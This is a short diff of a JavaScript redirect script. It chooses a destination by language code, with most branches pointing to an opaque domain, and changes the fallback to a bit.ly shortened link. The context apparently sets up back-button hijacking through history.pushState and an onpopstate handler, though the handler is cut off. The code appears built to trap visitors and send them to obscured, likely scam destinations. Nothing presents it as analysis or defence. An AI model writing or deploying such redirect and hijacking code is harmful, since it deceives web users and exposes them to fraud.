@@ -6,7 +6,7 @@ var bhs = lang;
 	else if(bhs == "VN") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"          
 	else if(bhs == "TR") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"    
 	else if(bhs == "RO") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"    
-	else                    var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"    
+	else                    var linkredir = "http://bit.ly/2MDtdmw"    
 
 window.history.pushState('forward', null, '');
 window.onpopstate = function() {
